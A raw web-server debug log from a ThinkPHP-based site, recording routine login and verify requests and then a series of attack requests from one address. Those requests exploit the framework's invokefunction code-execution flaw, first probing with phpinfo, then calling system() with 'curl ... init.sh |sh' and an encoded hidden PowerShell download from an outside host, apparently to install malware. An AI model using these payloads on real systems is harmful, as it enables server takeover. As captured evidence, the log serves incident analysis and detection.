[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000308s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000622s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000186s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000589s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000130s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000404s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000110s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000422s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000164s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000393s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000124s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000392s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000133s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000149s ]
[ log ] ###user_id=time=2019-09-26 21:40:55function=user/index/login
---------------------------------------------------------------
[ 2019-09-26T21:40:58+08:00 ] 172.16.170.169 42.236.10.78 GET /user/index/verify
[ info ] 47.96.126.228/user/index/verify [运行时间：0.037379s][吞吐率：26.75req/s] [内存消耗：3,950.88kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'verify',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
  'referer' => 'http://47.96.126.228/user/index/login',
  'accept-encoding' => 'gzip, deflate',
  'cookie' => 'PHPSESSID=lnd2kdjq61k0sb63gi56i9foi3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000370s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000726s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000168s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000736s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000158s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000503s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000110s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000483s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000155s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000476s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000156s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000489s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000151s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000156s ]
[ log ] ###user_id=time=2019-09-26 21:40:58function=user/index/verify
---------------------------------------------------------------
[ 2019-09-26T21:50:34+08:00 ] 172.16.170.169 42.236.10.117 GET /user/index/index
[ info ] 47.96.126.228/user/index/index [运行时间：0.028812s][吞吐率：34.71req/s] [内存消耗：3,928.16kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'upgrade-insecure-requests' => '1',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000305s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000644s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000173s ]
---------------------------------------------------------------
[ 2019-09-26T21:50:35+08:00 ] 172.16.170.169 47.110.243.116 GET /index.php
[ info ] 47.96.126.228/index.php [运行时间：0.030731s][吞吐率：32.54req/s] [内存消耗：3,922.95kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000311s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000684s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000161s ]
---------------------------------------------------------------
[ 2019-09-26T21:50:36+08:00 ] 172.16.170.169 47.110.243.116 GET /index.php/user/index/login
[ info ] 47.96.126.228/index.php/user/index/login [运行时间：0.035481s][吞吐率：28.18req/s] [内存消耗：3,957.43kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'referer' => 'http://47.96.126.228/index.php',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000338s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000706s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000167s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000590s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000132s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000430s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000106s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000424s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000138s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000391s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000128s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000387s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000156s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000145s ]
[ log ] ###user_id=time=2019-09-26 21:50:36function=user/index/login
---------------------------------------------------------------
[ 2019-09-26T21:50:36+08:00 ] 172.16.170.169 47.110.243.116 GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
[ info ] 47.96.126.228/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 [运行时间：0.014440s][吞吐率：69.25req/s] [内存消耗：1,652.95kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'phpinfo',
    1 => 
    array (
      0 => '1',
    ),
  ),
)
[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/web/core/library/think/App.php ]
[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {

  - Parameters [2] {
    Parameter #0 [ <required> $function_name ]
    Parameter #1 [ <required> $parameters ]
  }
}

[ info ] [ LOG ] INIT File
[ error ] [0]variable type error： boolean[/www/wwwroot/web/core/library/think/Response.php:318]
---------------------------------------------------------------
[ 2019-09-26T21:50:36+08:00 ] 172.16.170.169 47.110.243.116 GET /index.php?function=call_user_func_array&s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=system&vars%5B1%5D%5B%5D=curl+-fsSL+http%3A%2F%2F185.181.10.234%2FE5DB0E07C3D7BE80V520%2Finit.sh+%7Csh
[ info ] 47.96.126.228/index.php?function=call_user_func_array&s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=system&vars%5B1%5D%5B%5D=curl+-fsSL+http%3A%2F%2F185.181.10.234%2FE5DB0E07C3D7BE80V520%2Finit.sh+%7Csh [运行时间：0.014198s][吞吐率：70.43req/s] [内存消耗：1,672.88kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'curl -fsSL http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh |sh',
    ),
  ),
)
[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/web/core/library/think/App.php ]
[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {

  - Parameters [2] {
    Parameter #0 [ <required> $function_name ]
    Parameter #1 [ <required> $parameters ]
  }
}

[ info ] [ LOG ] INIT File
[ error ] [2]system() has been disabled for security reasons[/www/wwwroot/web/core/library/think/App.php:174]
---------------------------------------------------------------
[ 2019-09-26T21:50:36+08:00 ] 172.16.170.169 42.236.10.117 GET /user/index/index
[ info ] 47.96.126.228/user/index/index [运行时间：0.027073s][吞吐率：36.94req/s] [内存消耗：3,929.07kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.baidu.com/',
  'accept-encoding' => 'gzip, deflate',
  'cookie' => 'PHPSESSID=9ggtaed25sv99391osl3hpvd33',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000383s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000724s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000160s ]
---------------------------------------------------------------
[ 2019-09-26T21:50:37+08:00 ] 172.16.170.169 42.236.10.117 GET /user/index/login
[ info ] 47.96.126.228/user/index/login [运行时间：0.046079s][吞吐率：21.70req/s] [内存消耗：3,962.88kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.baidu.com/',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000403s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000821s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000233s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000788s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000152s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000633s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000135s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000549s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000169s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000539s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000181s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000530s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000163s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000185s ]
[ log ] ###user_id=time=2019-09-26 21:50:37function=user/index/login
---------------------------------------------------------------
[ 2019-09-26T21:50:38+08:00 ] 172.16.170.169 42.236.10.117 GET /user/index/verify
[ info ] 47.96.126.228/user/index/verify [运行时间：0.036730s][吞吐率：27.23req/s] [内存消耗：3,950.88kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'verify',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
  'referer' => 'http://47.96.126.228/user/index/login',
  'accept-encoding' => 'gzip, deflate',
  'cookie' => 'PHPSESSID=58vn0v8dg892g0cmgjj5qsh875',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000370s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000758s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000189s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000643s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000157s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000423s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000120s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000477s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000169s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000418s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000165s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000442s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000135s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000167s ]
[ log ] ###user_id=time=2019-09-26 21:50:38function=user/index/verify
---------------------------------------------------------------
[ 2019-09-26T21:51:06+08:00 ] 172.16.170.169 47.110.243.116 GET /index.php?function=call_user_func_array&s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cur+-fsSL+http%3A%2F%2F185.181.10.234%2FE5DB0E07C3D7BE80V520%2Finit.sh+%7Csh
[ info ] 47.96.126.228/index.php?function=call_user_func_array&s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cur+-fsSL+http%3A%2F%2F185.181.10.234%2FE5DB0E07C3D7BE80V520%2Finit.sh+%7Csh [运行时间：0.015418s][吞吐率：64.86req/s] [内存消耗：1,672.91kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'cur -fsSL http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh |sh',
    ),
  ),
)
[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/web/core/library/think/App.php ]
[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {

  - Parameters [2] {
    Parameter #0 [ <required> $function_name ]
    Parameter #1 [ <required> $parameters ]
  }
}

[ info ] [ LOG ] INIT File
[ error ] [2]system() has been disabled for security reasons[/www/wwwroot/web/core/library/think/App.php:174]
---------------------------------------------------------------
[ 2019-09-26T21:51:36+08:00 ] 172.16.170.169 47.110.243.116 GET /index.php?function=call_user_func_array&s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cmd.exe+%2Fc+powershell+-windowstyle+hidden+-nop+-enc+aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQA4ADEALgAxADAALgAyADMANAAvAEUANQBEAEIAMABFADAANwBDADMARAA3AEIARQA4ADAAVgA1ADIAMAAvAGkAbgBpAHQALgBwAHMAMQAnACkA
[ info ] 47.96.126.228/index.php?function=call_user_func_array&s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=system&vars%5B1%5D%5B%5D=cmd.exe+%2Fc+powershell+-windowstyle+hidden+-nop+-enc+aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQA4ADEALgAxADAALgAyADMANAAvAEUANQBEAEIAMABFADAANwBDADMARAA3AEIARQA4ADAAVgA1ADIAMAAvAGkAbgBpAHQALgBwAHMAMQAnACkA [运行时间：0.014354s][吞吐率：69.67req/s] [内存消耗：1,673.56kb] [文件加载：35]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
